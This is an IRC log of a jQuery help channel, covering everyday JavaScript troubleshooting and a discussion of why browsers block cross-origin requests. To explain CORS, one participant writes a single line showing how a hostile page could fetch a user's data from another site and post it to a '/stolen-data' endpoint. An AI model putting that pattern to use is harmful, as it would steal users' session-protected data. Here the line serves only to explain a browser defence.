[00:17:17] <dimi1947> ok...cork...bear in ind though that this number will vary
[00:17:48] <Cork> dimi1947: yes, and that is why it should be a separate attribute
[00:18:14] <Cork> dimi1947: you could crop it from the id string, but i would really recommend a separate attribute
[00:18:38] <Cork> this.id[this.id.length-1] should also work
[00:18:46] <dimi1947> got it
[00:19:06] <dimi1947> i better stick with the data attribute
[00:19:16] <Cork> ya, it is a cleaner solution
[00:19:50] <Cork> storing things in id, class, rel and so on was common before, cause no other attributes was allowed
[00:20:11] <Cork> but now when they have added data- in the spec, there is no reason to abuse those attributes anymore
[00:21:03] <dimi1947> and now I must access it...
[00:21:23] <Cork> $(this).data('number') or what ever you called the attribute
[00:22:09] <dimi1947> yeah...just saw it...in jquery page
[00:23:10] <Cork> this.dataset.number is another option
[00:23:33] <Cork> though that requires that the browser has support for parsing the data-* attributes
[00:25:26] <dimi1947> give me a second cause I am stuck on a detail
[00:50:17] <smgul_> I'm trying to POST a form with a certain radio button selected, but I can't figure out how to format the submitted data to mimic how the web page submits it.
[00:50:20] <smgul_> It might have something to do with setting an attribute to (checked="checked"). https://jsfiddle.net/excwrp16/1/
[00:51:16] <Cork> smgul_: https://jsfiddle.net/excwrp16/2/
[00:51:39] <smgul_> I don't want to re-make the whole form in JS and serialize() if possible
[00:52:15] <smgul_> since it'll be executed from a different page
[00:52:43] <Cork> smgul_: .checked doesn't take a string
[00:52:45] <Cork> it takes a boolean
[00:53:00] <Cork> though ya !!'checked' == true so it "works"
[00:53:08] <Cork> but you should really fix that
[00:53:34] <smgul_> that's how the html on the page is, I can't control it
[00:55:54] <Cork> smgul_: this should be the same as the form: https://jsfiddle.net/excwrp16/3/
[00:58:35] <smgul_> what about a non-blank form? such as after someone types something into one of the fields
[00:58:54] <Cork> you said you didn't want to use the form
[00:59:00] <Cork> so what the user does doesn't matter
[00:59:08] <Cork> that post is static
[00:59:19] <Cork> if you want based on what the user does you should use /1
[01:00:03] <beepbeep_> I have a problem with a jqxhr object that doesn't trigger it's done callback.
[01:00:08] <beepbeep_> I have no idea how to debug this
[01:00:21] <beepbeep_> the request is succesfull
[01:00:32] <beepbeep_> I can see the response in my toolbar
[01:00:34] <Cork> also don't use alert
[01:00:45] <beepbeep_> when I console.log the jqxhr object, I can see the response
[01:00:48] <Cork> https://jsfiddle.net/excwrp16/5/
[01:00:52] <beepbeep_> but done is not triggered :(
[01:01:21] <Cork> either you have code error (bind an .fail handler)
[01:01:30] <Cork> or the server doesn't send a 200 response
[01:01:43] <smgul_> mmm... well, I'm the only user, and I want to mimic submitting the post without actually going to the web page in question
[01:02:06] <Cork> smgul_: the browser won't help you there
[01:02:22] <Cork> it blocks cors so you won't be able to post to it
[01:02:42] <Cork> beepbeep_: part of that was for you, missed that it was a different nick asking
[01:02:49] <beepbeep_> Cork, I got that! :)
[01:02:55] <beepbeep_> Cork, yep, fail is triggered
[01:03:02] <beepbeep_> I'll figure it out, thx!
[01:03:07] <Cork> np
[01:04:43] <beepbeep_> Cork, hmm seems like I have a parse error somewhere
[01:04:46] <beepbeep_> very weird :p
[01:06:29] <Voyage> How to find the 215th column? in a json
[01:06:41] <Cork> json doesn't have columns
[01:06:59] <Cork> so you would have to show the format of the json
[01:07:28] <Voyage> Cork,  see line 4 then http://pastie.org/10449630#4,25,31
[01:08:32] <xec> "column" probably means character number in this context
[01:08:58] <Uhkis> thought this was #jquery, not #java
[01:09:07] <beepbeep_> Cork, aha, parse error in parseJSON :)
[01:09:37] <Cork> if anyone want to dig into that json here is a pretty printed version http://jsfiddle.net/63jd1c7y/
[01:10:37] <xec> Voyage: character number 215 appears to be the number 1 after "parentListItem":
[01:11:29] <xec> Voyage: so apparently your class (? i don't know java) expects an object instead of a number
[01:11:40] <Cork> O_o
[01:12:04] <Cork> uh... ok i just assumed the question was an answer from a java server
[01:12:18] <Cork> Voyage: you should ask java questions in ##java not #jquery...
[01:12:40] <Voyage> k
[01:13:16] <Cork> (i just scanned for the json and ignored the rest... :x)
[01:13:19] * xec updates his CV with "java support"
[01:13:24] <Cork> heh
[01:13:28] <Uhkis> :D
[01:13:50] <Cork> i could do it, but ugg i don't want to fiddle with java if i don't have to
[01:14:09] <Cork> the language is ok, but man is its performance horrible
[01:16:02] <xec> i know c# pretty well and java looks pretty much the same
[01:16:29] <xec> every time i write c# I appreciate javascript a little more
[01:16:40] <Cork> both are basically c inspired, like most of the modern languages
[01:16:52] <Uhkis> but of course, js isn't tied to windows
[01:16:53] <Cork> so ya, learn one and learn them all :D
[01:17:28] <xec> Uhkis: C# isn't either actually (open standard), and now, neither is .NET
[01:17:50] <Uhkis> xec: in practise howevery, it is
[01:17:54] <Uhkis> -y
[01:18:14] <Cork> eh, open documented, but it isn't open
[01:18:27] <Cork> it is still one company playing the tune
[01:20:16] <xec> thats true, and the only decent tool is windows-only
[01:20:24] <Cork> ya
[01:20:36] <Cork> well as of yet, it looks like that might change though
[01:20:55] <xec> i'm not holding my breath ;)
[01:21:02] <Cork> me nether
[01:21:16] <Cork> i prefer go or rust if i go binary anyway
[01:21:29] <xec> i remember being really excited about apple making the core of OS X open source back in 2000
[01:21:32] <Cork> two really nice languages
[01:21:41] <Cork> heh ya
[01:21:48] <Cork> when they imported bsd
[01:22:48] <xec> turns out it didn't really mean much
[01:23:15] <xec> *afk*
[01:27:56] <phiz> Microsoft is open sourcing more and more of its .NET technologies
[01:28:14] <Cork> yes, but open source doesn't mean open standard
[01:28:29] <Cork> it just means the source code for the implementation is free to contribute to
[01:29:22] <Cork> open standard requires that you have an independent body handling the language like java, ecmascript, css, html c, c++... has
[01:32:48] <r000ty_> anyone done much work with select2?
[01:34:06] <Uhkis> chosen.
[01:35:12] <xec> Cork: C# is an open standard in that sense, standardized by ecma
[01:36:28] <r000ty_> Uhkis, what makes you prefer that over the other?

[01:44:20] <Uhkis> plural?
[01:44:49] <Cork> well i was thinking of the spammers in general
[01:44:53] <xec> there were 313 of them
[01:45:18] <Uhkis> hmm, i missed something for ignoring joins and quits?
[01:45:19] <Cork> or if you meant the ops, ya we have hundreds of them
[01:45:29] <Cork> na it was just one
[01:45:33] <xec> no, i was joking
[01:46:24] <Cork> i kinda regret i didn't ask for op back when it was offered, i thought at least some of those ops would actually be present in the channel...
[01:46:43] <shoky_> hiya
[01:46:50] <xec> hi shoky_
[01:47:05] <shoky_> is there still spam going on or finished for now ?

[01:53:26] <Cork> ah, the bot is dead again
[01:53:43] <Cork> mampam: just ask the question, don't ask if someone want to look at it
[01:53:54] <Cork> (don't make ppl ask for the question, just ask it)
[01:53:56] <mampam> ok
[01:54:28] <mampam> what might be the issue causing me to not see the data in my autocomplete form input
[01:54:50] <mampam> the network tab in my browser debug took shows that there is data being returned from my model
[01:55:24] <Cork> mampam: make sure the json has the correct format
[01:56:55] <mampam> Cork: it looks like the correct json format to me
[01:57:26] <mampam> {     "carNames": {         "12": "Ferrari"     } }
[01:57:46] <Cork> that isn't correct
[01:57:54] <mampam> oh ok
[01:58:02] <mampam> how should it look

[01:59:13] <Uhkis> is it just me or is this firefox 41 super unstable?
[01:59:31] <Cork> haven't had much problem with it
[01:59:56] <Uhkis> borderline unusable here
[02:00:05] <Cork> what os?
[02:00:12] <Uhkis> 2-5 sec freezes ~10 times per minute
[02:00:21] <Uhkis> Linux arch 4.1.6-1-ARCH
[02:00:39] <Cork> sounds like either disk problem or a corrupt profile
[02:00:48] <Uhkis> on gnome, iirc we have the same setup?
[02:01:38] <Cork> basically ya :)
[02:01:47] <Uhkis> co-worker mentioned same kind of freezes too
[02:02:03] <Uhkis> it's like javascript engine went back to 2005 state

[03:04:47] <rindolf> Hi all. Sup?
[03:20:21] <chrnybo> Care to explain something for me?  Why is it that a local html document is allowed ajax access to json from a faraway data source, but the same document, when loaded from a local web server, is not allowed ajax access to the faraway data source?
[03:21:10] <chrnybo> I'm in Safari 8 on yosemite.
[03:22:43] <Cork> chrnybo: that depends on the browser
[03:23:08] <Cork> chrnybo: but the blocking of cross domain ajax is cause you can grab users session cookie
[03:23:11] <Cork> there passwords
[03:23:15] <Cork> and things like that
[03:23:23] <Cork> it is less of a problem from a local html file
[03:25:12] <chrnybo> Given that I control the local web server that serves the html file, but not the faraway json data source, is there something I can do to get the json even when the html page is loaded with http?
[03:25:44] <Cork> you can proxy the request over your domain
[03:25:58] <Cork> so the session becomes towards your server and not the remote server
[03:26:04] <Cork> then the cookie problem goes away
[03:27:01] <chrnybo> Cork: Yeah, only the json is password-protected and access to it depends on having a session going.
[03:28:24] <chrnybo> A coworker advised me to set Access-Control-Allow-Origin: * on the local web server, and I did, even if it does not make much sense from security point of view.  It did not work either.
[03:28:40] <mrtAkdeniz> guys
[03:28:44] <mrtAkdeniz> any idea ? http://pastie.org/private/lfah5bagjyjbjuoiprqq
[03:28:53] <Uhkis> the remote server should have that
[03:29:10] <mrtAkdeniz> it makes option count object count
[03:29:13] <mrtAkdeniz> but can't get values
[03:29:17] <chrnybo> Uhkis: Yeah, that makes more sense.
[03:29:18] <mrtAkdeniz> or id
[03:29:26] <mrtAkdeniz> it is just rendered as = <option></option>
[03:29:29] <Uhkis> mrtAkdeniz: jsfiddle.net
[03:29:34] <mrtAkdeniz> oh ok
[03:30:37] <chrnybo> Kinda rusty regarding js, so wanted a second opinion prior to gently informing said coworker that I think he's wrong.
[03:32:30] <mrtAkdeniz> Uhkis, here you go
[03:32:30] <mrtAkdeniz> https://jsfiddle.net/mg6m2fwf/
[03:35:28] <chrnybo> mrtAkdeniz: Is there anything for each to loop on when the document is initialized?
[03:36:03] <mrtAkdeniz> each function is not a loop?
[03:36:13] <mrtAkdeniz> chrnybo, should I write a new for loop for it?
[03:41:01] <Uhkis> mrtAkdeniz: https://jsfiddle.net/mg6m2fwf/3/
[03:41:01] <hellyeah> hey why i got this error https://jsfiddle.net/j8q4z9bv/14/ --> Uncaught RangeError: Maximum call stack size exceeded i just try  to add delegate to fires child of tr in tbody.
[03:41:33] <mrtAkdeniz> Uhkis, yeaaah, index and value; not key value...
[03:41:37] <mrtAkdeniz> thank you so much :)
[03:41:54] <Uhkis> mrtAkdeniz: and you used wrong variable name
[03:41:55] <hellyeah> mrtAkdeniz: are you Turkish?
[03:42:36] <mrtAkdeniz> hellyeah, yes. Uhkis , I'm so newbie on js and frontend.. on system or backend, i'm using foreach($var as $newVar)
[03:42:54] <mrtAkdeniz> and I make a stupid way for myself, but obviously did not work :3
[03:43:33] <Uhkis> mrtAkdeniz: regular javascript for would be closer to the php syntax
[03:43:41] <hellyeah> mrtAkdeniz: do you have array, nodelist?
[03:43:53] <mrtAkdeniz> hellyeah, array of objects
[03:43:58] <mrtAkdeniz> but Uhkis solved my problem
[03:44:10] <hellyeah> each() will work?
[03:44:15] <mrtAkdeniz> yeah it worked
[03:44:20] <hellyeah> ah okey
[03:44:29] <Uhkis> hellyeah: you're calling alert inside alert, resulting in infinite recursion
[03:44:39] <mrtAkdeniz> Uhkis, yes.. and I were going to use regular js with for loop if it did not work..
[03:44:45] <hellyeah> $(".smt').each(function(){..});
[03:45:16] <hellyeah> DAMN
[03:45:18] <hellyeah> you are right
[03:45:23] <hellyeah> need to change function name
[03:46:21] <hellyeah> Uhkis: Uncaught TypeError: ((jQuery.event.special[handleObj.origType] || (intermediate value)).handle || handleObj.handler).apply is not a function this is the error now
[03:47:06] <Uhkis> hellyeah: update and relink please
[03:47:26] <hellyeah> ops
[03:47:27] <hellyeah> sorry
[03:47:42] <hellyeah> Uhkis: https://jsfiddle.net/j8q4z9bv/15/
[03:50:52] <Cork> chrnybo: the cors header only matters on the server with the data, else it would be pointless
[03:51:26] <hellyeah> Uhkis: any advice?
[03:51:28] <Cork> chrnybo: the cors header is there to state for the browser "yes you can allow cross domain requests, i'm configured to not leak data if used with it"
[03:52:01] <Uhkis> hellyeah: what's wrong with it now?
[03:52:09] <Cork> chrnybo: and the source of the request can't state that, cause that would be like the robber saying it is ok to let him into the house
[03:52:43] <chrnybo> Cork: Makes sense.  But kinda confusing that file:/// urls can bypass that.
[03:52:48] <Uhkis> hellyeah: https://jsfiddle.net/j8q4z9bv/16/
[03:52:58] <hellyeah> Uhkis: when you click image button on the table you got this error Uncaught TypeError: ((jQuery.event.special[handleObj.origType] || (intermediate value)).handle || handleObj.handler).apply is not a function
[03:53:00] <Uhkis> hellyeah: don't use () when referring to a function
[03:53:05] <Cork> chrnybo: ya, like i said depends on the browser
[03:53:17] <Cork> chrnybo: chrome and firefox requires cors headers for that too
[03:53:20] <hellyeah> Uhkis: ic
[03:53:31] <chrnybo> Ah, nice to know.
[03:53:45] <hellyeah> does it cause error or smt?
[03:53:57] <Cork> chrnybo: not i don't think this is true for chrome or firefox on ios
[03:54:05] <Uhkis> hellyeah: it causes exactly that error ;)
[03:54:07] <Cork> as those are just themed safari webviews
[03:54:27] <Cork> not==note
[03:54:47] <hellyeah> hmm
[03:54:57] <hellyeah> Uhkis: do you suggest me to use 'use strict'
[03:55:24] <Uhkis> everyone should!
[03:55:52] <chrnybo> So, if I can wrap the html file I've made as a sorta iOS "App", it could possibly fetch the json from afar?
[03:56:14] <hellyeah> Uhkis: btw is there a method or library to read xml with jquery?
[03:56:17] <Cork> chrnybo: it is much better to have the webserver proxy it
[03:56:29] <Cork> much less likelihood of problems
[03:57:43] <chrnybo> Cork: In my case that'd require that I handle a logged-in session, on befalf of coworkers, towards the faraway server, which is the sharepoint of $ENTERPRISE.
[03:58:00] <hellyeah> Uhkis: is it cool like that https://jsfiddle.net/j8q4z9bv/19/ ?
[03:58:07] <Cork> chrnybo: and there you have why it doesn't allow cors
[03:58:18] <Cork> it would be a security problem if it did
[03:59:07] <chrnybo> Cork: Agreed. I grok the "logged in to bank while on dodgy website in another tab"-scenario.
[03:59:23] <Krisostoomus> hey. what does Uncaught Error: Invalid XML: https://www.readability.com/rseero/latest/feed mean ?
[03:59:45] <Cork> chrnybo: cause if they allowed cors then any site could do $.ajax('your/site/url').done(function(data) { $.ajax('/stolen-data', data); })
[03:59:53] <Cork> :)
[04:00:09] <Krisostoomus> anybody knows?
[04:00:30] <Cork> Krisostoomus: it means it can't parse the xml
[04:00:37] <Cork> xml doesn't have error correction like html does
[04:00:50] <chrnybo> I'll talk to the people running the intranet and ask what it takes to install a page there.  Wish me luck.
[04:01:09] <Uhkis> hellyeah: jquery has parseXML()
[04:01:10] <Krisostoomus> thanks
[04:01:14] <Cork> chrnybo: ya, been there done that ,it isn
[04:01:20] <Cork> , it isn't fun
[04:01:43] <hellyeah> Uhkis: this is Krisostoomus question
[04:01:58] <Uhkis> [13:56] < hellyeah> Uhkis: btw is there a method or library to read xml with jquery?
[04:02:06] <hellyeah> ops
[04:02:08] <hellyeah> sorry
[04:02:10] <Krisostoomus> thanks
[04:02:26] <hellyeah> Krisostoomus: parseXML
[04:03:26] <Krisostoomus> hellyeah, i see, that you are trying to help me, but Cork already said something - that it contains errors , the xml
[04:03:33] <Uhkis> Krisostoomus: in my experience, parseXML doesn't really support rss
[04:03:37] <Krisostoomus> i was using this
[04:03:46] <Krisostoomus> oh
[04:03:52] <Krisostoomus> interesting to know
[04:04:08] <Uhkis> i think i got a few gray hairs trying to work around it :D
[04:04:41] <Krisostoomus> why?
[04:04:43] <Krisostoomus> :D
[04:04:56] <Uhkis> it was REALLY frustrating :D
[04:05:46] <Krisostoomus> i wrote to the employer....i am a front end dev. and i cant parse that then i guess
[04:06:21] <Uhkis> i was doing node at that point, i ended up modifying some npm module
[04:06:54] <Krisostoomus> i was parsing forums when i was a php developer... about 7 forums with some php library....but now i apply for front end
[04:07:33] <Uhkis> i'd love to do frontend only now, backend is so boring
[04:09:48] <hellyeah> hey how can i apply all first child of tr https://jsfiddle.net/j8q4z9bv/19/
[04:11:43] <hellyeah> did it
[04:11:51] <Uhkis> tr -> td ;-)
[04:11:55] <hellyeah> ye
[04:11:58] <hellyeah> :XD
[04:21:48] <Krisostoomus> XMLHttpRequest cannot load https://www.readability.com/rseero/latest/feed. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
[04:22:17] <Krisostoomus> how can i read xml?
[04:22:20] <chrnybo> This is CORS! I know this!
[04:23:03] <Cork> Krisostoomus: javascript isn't allowed to load xml from a third party domain unless that domain explicitly allow it
[04:23:21] <Cork> the only formats allowed to load cross domain is images and javascript
[04:23:25] <Cork> (and css)
[04:24:07] <Uhkis> which is pretty weird because those are way more dangerous
[04:24:28] <hellyeah> hey what did i do wrong here why i cannot get dialog box? http://jsfiddle.net/j8q4z9bv/23/
[04:24:33] <Krisostoomus> i tried parseXML from jquery, it said that it's invalid xml
[04:24:53] <taplar> hellyeah: when should you get a dialog?
[04:25:08] <Uhkis> hellyeah: there's no popup2 element
[04:25:47] <hellyeah> DAMN
[04:27:33] <Cork> Uhkis: images aren't dangerous, but ya, js are
[04:27:52] <Uhkis> iirc you can pump a lot of nasty stuff to images
[04:27:54] <Cork> they are allowed cause they couldn't add the cors block for it cause it would break the existing web back then
[04:28:09] <Cork> Uhkis: not unless you have a bug in the image decoder
[04:28:34] <Cork> cors was allowed until around 97 if i remember correctly :)
[04:28:59] <Uhkis> https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html (random google)
[04:29:56] <Cork> Uhkis: ya, but from a browsers point of view the images from the local domain would be as dangerous
[04:30:11] <Cork> so they have to have protection against that kind of problem no matter where the image comes from
[04:38:03] <Uhkis> Cork: great, the freezes were caused by firebug
[04:38:16] <Uhkis> that's not good at all
[04:38:29] <hellyeah> is there any method for making box sizable accoreding to witdth and height of text?
[04:39:02] <hellyeah> http://jsfiddle.net/av9hfb9L/4/ click the image box
[04:39:15] <hellyeah> i just want to make this box small but some text can be long
[04:39:18] <taplar> hellyeah: you could try the 'em' or 'rem' size units for the box
[04:39:52] <hellyeah> em for width rem for height?
[04:39:54] <Krisostoomus> http://www.ecigarettedirect.co.uk/ashtray-blog/wp-content/uploads/2012/09/einstein-pipe-moving.gif
[04:40:14] <taplar> no, they're different units of measurement, like 'px' or '%'
[04:40:21] <hellyeah> ic
[04:41:00] <hellyeah> i need to find longest text on table i guess
[04:41:18] <Uhkis> taplar: what's rem?
[04:41:30] <taplar> rem is em, but it's not relative,  i believe
[04:41:41] <taplar> it only takes into account the base font size
[04:42:39] <hellyeah> a sec
[04:43:52] <taplar> yeah
[04:44:02] <taplar> root em
[04:44:03] <hellyeah> i try to write a fiddle
[04:45:27] <hellyeah> taplar: is it px value https://jsfiddle.net/wk0awfme/2/
[04:45:51] <taplar> no, hold on, i'll demonstrate
[04:45:59] <hellyeah> thanks
[04:46:28] <hellyeah> i am waiting thank you
[04:50:41] <taplar> https://jsfiddle.net/65we06zk/
[04:50:55] <taplar> very contrived example, but it works
[04:51:07] <taplar> notice how the boxes have different sizes, though their div css has the same value
[04:51:28] <taplar> it's because 'em' derives its value based off of it's inherited font size value
[04:53:36] <hellyeah> ah,
[04:53:43] <taplar> 'rem' is like 'em', but it does not inherit the font size.  instead it always looks to the root font size to know how to calculate
[04:54:27] <hellyeah> taplar: text could be wrong https://jsfiddle.net/65we06zk/1/
[04:55:20] <taplar> right, not saying it's a silver bullet, but if your wanting to size an area depending on font size, em and rem is an option
[04:55:36] <taplar> it takes into account font-size. it does not take into account how much text you have
[04:56:10] <hellyeah> ic
[04:56:24] <hellyeah> i have idea like that
[04:56:33] <hellyeah> to calculate width of text
[04:56:41] <hellyeah> and give this number as width of box
[04:57:06] <hellyeah> does it seem good idea?
[04:57:08] <taplar> you could just not give your element a static width/height and let it grow
[04:57:19] <taplar> give it a min and/or max if you want
[04:57:39] <hellyeah> hmm a sec
[04:58:25] <hellyeah> like that http://jsfiddle.net/av9hfb9L/5/ ?
[04:58:44] <AbuDhar> guys
[04:59:19] <taplar> hellyeah: what did you change?
[04:59:26] <hellyeah> hmm
[04:59:30] <AbuDhar> https://gist.github.com/anonymous/7d0dcead465f383f0b19 what's wrong?
[04:59:34] <hellyeah> i did minWidth to maxWidth.
[05:01:01] <taplar> i think that's towards what your after
[05:01:23] <AbuDhar> anyone???
[05:01:54] <taplar> AbuDhar: the last line your doing invocations instead of giving functions
[05:02:18] <taplar> should be: $( '.profession-circle' ).mouseenter( removeOverlay ).mouseleave( showOverlay );
[05:03:32] <AbuDhar> ohhhhhhhh
[05:03:35] <AbuDhar> let me try that :)
[05:03:36] <AbuDhar> thanks
[05:04:05] <jdo_dk> Does anyone know a jquery plugin, which can be used to handle ajax loads of content on a page? Ajax navigation, but should also be able to handle pages and subpages with different "actions" ?
[05:05:13] <mrtAkdeniz> hey guys
[05:05:23] <mrtAkdeniz> what is the way to pass get values to a page with $.get() ?
[05:05:41] <mrtAkdeniz> i want to access "index.php?blabla=foo"
[05:06:02] <mrtAkdeniz> $.get("index.php", { blabla: foo }); did not work
[05:06:11] <taplar> just build that url string
[05:06:30] <mrtAkdeniz> taplar, what you mean?
[05:06:45] <mrtAkdeniz> $.get("index.php?blabla=foo") ?
[05:06:49] <taplar> yup
[05:06:57] <mrtAkdeniz> taplar, is it good?
[05:07:02] <taplar> it should work
[05:07:11] <mrtAkdeniz> probably, but i don't think it is the proper way
[05:07:50] <taplar> you could switch to $.ajax if you wanted and use the url and data options
[05:09:11] <mrtAkdeniz> taplar, thanks!
[05:09:28] <taplar> though from the docs it looks like yours should have worked
[05:09:37] <taplar> what did your call look like?
[05:10:58] <AbuDhar> taplar: that still doesn't do anything.
[05:11:23] <hellyeah> taplar: one more question why local storage didnt wortk here? http://jsfiddle.net/av9hfb9L/7/
[05:12:30] <taplar> AbuDhar: try putting some console.log's in your functions to see if they are happening
[05:13:22] <AbuDhar> ReferenceError: $f is not defined what does this mean? :S
[05:13:55] <taplar> usually something does not exist
[05:14:00] <AbuDhar> I don't have $f anywhere :)
[05:14:23] <AbuDhar> anyway taplar it does go into the functions
[05:14:39] <AbuDhar> $('.profession-circle').closest('.overlay-wrapper').find('.overlay-name').show();
[05:14:44] <hellyeah> i will be back
[05:15:08] <AbuDhar> taplar: this is the html ... https://gist.github.com/anonymous/487cc541af3c83928bd1
[05:15:28] <taplar> AbuDhar: instead of looking up the circle, try using $(this)
[05:16:30] <AbuDhar> taplar: in the functions?
[05:16:33] <AbuDhar> didn't work
[05:16:38] <taplar> yeah
[05:17:16] <taplar> ok, then start doing some logging.  log $(this).closest('.overlay-wrapper').length and see what you get, then try the next find and see
[05:17:56] <taplar> oh!
[05:18:02] <taplar> no, closest goes up
[05:18:09] <taplar> your overlay-wrapper is a child
[05:18:17] <AbuDhar> oh
[05:19:01] <taplar> so you could actually just jump to the find for the overlay name
[05:19:04] <Narhir_> Hello guys
[05:19:23] <Narhir_> this script doesn't allow me entering "multiple spaces between characters" but only one space
[05:19:24] <Narhir_> http://www.79level.com/dogform/dogtag.html
[05:19:32] <Narhir_> js: http://www.79level.com/dogform/dogtag.js
[05:19:36] <AbuDhar> YEAAAAAAAAAAAAAAAAAAAAAAAAAH taplar THANKS
[05:19:38] <AbuDhar> :D
[05:19:41] <taplar> :)
[05:19:43] <Narhir_> is there any easy way to fix this ?;/
[05:23:16] <Cork> Narhir_: you mean you only want to count visible characters?
[05:23:26] <taplar> Narhir_: the spacing is there, it's the html display that is hiding the extra whitespace
[05:23:57] <Narhir_> I want the extra spaces to be visible in the output
[05:23:59] <taplar> i forget how to fix that.  you might can surround it with a <pre>
[05:24:01] <Cork> an option is to set white-space: pre-wrap in the css for the div
[05:24:06] <taplar> ^
[05:24:07] <taplar> better
[05:24:38] <Narhir_> brilliant
[05:24:41] <Narhir_> will give it a try
[05:40:03] <_el_fer_> Hi people
[05:40:10] <_el_fer_> I need a hand here: https://gist.github.com/fvitale/c8619ba3739f279ea9bb
[05:40:27] <_el_fer_> I found a couple of node.js examples, as well as a browser example of a code I am working with
[05:41:01] <_el_fer_> what I need is, to make a browser code that would be the equivalent to node.js EXAMPLE 2 in the gist
[05:41:19] <_el_fer_> that would be the "on('httpUploadProgress', function(evt) {" part
[05:41:35] <_el_fer_> that event handler, how would I make it a browser jquery code?
[05:43:38] <hellyeah> yo
[05:44:09] <hellyeah> did you help me to figure out why localstorage didnt wortk here as it is supposed to work http://jsfiddle.net/av9hfb9L/7/
[05:45:54] <taplar> i don't see an id on your buttonClass
[05:48:43] <hellyeah> hmm first i need to add buttonClass to first cell of td
[05:53:44] <hellyeah> taplar: does it seem good solution to do http://jsfiddle.net/av9hfb9L/11/ ?
[05:54:21] <hellyeah> but it seems localstoragew still didnt work
[05:55:05] <taplar> why are you putting the class on the div?
[05:55:51] <hellyeah> td?
[05:55:59] <hellyeah> which div?
[05:56:02] <taplar> yeah, sorry, td
[05:56:19] <hellyeah> hmm
[05:56:37] <hellyeah> honestly i will do something and i want to apply this to every button
[05:56:47] <hellyeah> s
[05:57:02] <hellyeah> like popping up a window
[05:57:14] <hellyeah> with some contents sorry for entering much
[05:58:25] <hellyeah> taplar: it doesnt make sense?
[05:58:42] <taplar> not right now
[05:58:53] <taplar> your still looking for an id on an element that does not have one
[05:59:01] <taplar> not sure how putting the class on the parent td fixes that
[05:59:13] <printForever> what is this.nodeType === 3 ?
[05:59:27] <printForever> I have a div with text and tags, I want to remove text
[05:59:36] <printForever> found this answer
[05:59:37] <printForever> http://stackoverflow.com/questions/3421999/jquery-remove-only-text-content-from-a-div
[06:00:00] <printForever> but I don't understand what the script is filtering or what is nodeType === 3;
[06:00:00] <mrtAkdeniz> hey guys
[06:00:25] <mrtAkdeniz> what is the function to clear appended text when on new select?
[06:00:37] <mrtAkdeniz> i'm appending a select on a trigger of another select
[06:00:39] <mrtAkdeniz> it works good
[06:00:45] <mrtAkdeniz> but after first choice, it is stop working
[06:01:05] <mrtAkdeniz> when I select 2nd option on first select, it still shows first option's items
[06:01:10] <printForever> found it, it's the value for text
[06:01:28] <taplar> mrtAkdeniz: a fiddle would be handy
[06:01:29] <hellyeah> taplar: it is not necessary may be any better suggestion?
[06:02:21] <taplar> hellyeah: you need some way to identify it, either by an id or an index or something.  if things can change position index wouldn't be the way to go
[06:02:30] <mrtAkdeniz> taplar, really it would be so hard right now.. even i don't know what is where.. just think like that, there are 2 select inputs. when first one changed and selected an option, other one filled with depended to first one..
[06:02:34] <mrtAkdeniz> it works good for once
[06:02:50] <mrtAkdeniz> but when i change first select again, it stop working, no error, no mistake: nothing.
[06:03:13] <mrtAkdeniz> so i need to clear first when change function.. but $('#element').clear(); did not work
[06:03:30] <taplar> remove the options?
[06:03:52] <mrtAkdeniz> taplar, found it
[06:03:55] <mrtAkdeniz> it was not clear
[06:04:00] <mrtAkdeniz> it was .empty() :3
[06:04:05] <taplar> :)
[06:04:12] <mrtAkdeniz> thank you anyway!
[06:04:39] <hellyeah> taplar: it didnt work like that http://jsfiddle.net/av9hfb9L/12/
[06:05:16] <hellyeah> i just want to show spesific row in pop up windows when you click image button on the table.
[06:06:51] <taplar> it was working when you had .buttonClass, not td:first-child
[06:09:09] <hellyeah> yes
[06:10:53] <hellyeah> taplar: but localstorage didnt work also i cannot do console.log id of button http://jsfiddle.net/av9hfb9L/14/
[06:11:27] <taplar> i've said this like twice, now, but i'll say it again.  your images do not have ids...
[06:11:53] <mcfdez87> Hello. I'm trying to change a date format https://jsfiddle.net/0bt4ft8n/, but I get an incorrrect date. Any suggestion please?
[06:14:01] <hellyeah> yea
[06:14:05] <hellyeah> sorry taplar
[06:16:16] <MarkyC> mcfdez87: getFullMonth() returns the month in your local time
[06:16:35] <MarkyC> mcfdez87: use toLocaleString
[06:16:41] <mcfdez87> MarkyC, I solved, was getDate instead getDay
[06:16:59] <mcfdez87> now I'm trying to applie zeros for days and dates that are < 10
[06:17:09] <MarkyC> mcfdez87: use toLocaleString
[06:21:16] <hellyeah> taplar: what about this http://jsfiddle.net/av9hfb9L/20/
[06:22:06] <hellyeah> is there an improvement?
[06:23:31] <taplar> doesn't appear to restore the option. stepping away for a bit
[06:44:16] <printForever> is there a way to get location.href but only the path, not the entire url
[06:44:34] <printForever> example.com/art/books.html
[06:44:46] <printForever> I would like to get "art" from that url
[06:44:49] <Cork> location.path?
[06:44:58] <Cork> ?mdn location
[06:45:06] <printForever> location.path returns /art/books.html
[06:45:23] <Cork> uh so you want the full url but without the protocol?
[06:45:30] <Cork> (that isn't a valid url)
[06:45:33] <printForever> no
[06:45:45] <Cork> ah
[06:45:53] <printForever> http://www.example.com/art/books.html
[06:45:58] <printForever> I just want "art"
[06:46:04] <Cork> you would have to use regex
[06:46:06] <Kartagis> location.path.split("/")[2]
[06:46:10] <Cork> http doesn't have files
[06:46:16] <printForever> any easier way?
[06:46:16] <Cork> so there is nothing except for path
[06:46:22] <printForever> like filtering the result?
[06:46:30] <NoiseEee_> printForever: kartagis just answered
[06:46:31] <Cork> .match(\/(.*)\/)
[06:46:36] <Cork> no
[06:46:44] <Cork> there isn't any results
[06:46:46] <Cork> it is a string
[06:46:52] <printForever> Kartagis: thank you, NoiseEee_ thank you
[06:47:13] <Cork> though it is pathname not path :)
[06:47:23] <Kartagis> np
[06:47:25] <Cork> (my mistake though)
[06:47:41] <printForever> pathname
[06:47:47] <printForever> hm...
[06:47:59] <NoiseEee_> window.location.pathname.split("/")[1]
[06:48:02] <Cork> printForever: also check the example here https://developer.mozilla.org/en-US/docs/Web/API/URLUtils/pathname
[06:48:07] <Cork> you might want to use that
[06:48:23] <printForever> thank you NoiseEee_
[06:48:28] <Cork> specifically https://developer.mozilla.org/en-US/docs/Web/API/URLUtils/pathname#Get_the_folder_portion_of_a_pathname_string

[07:23:20] <hellyeah> NoiseEee_:first problem is about when you close pop up window it open again
[07:24:16] <hellyeah> NoiseEee_: but i just change the value in close

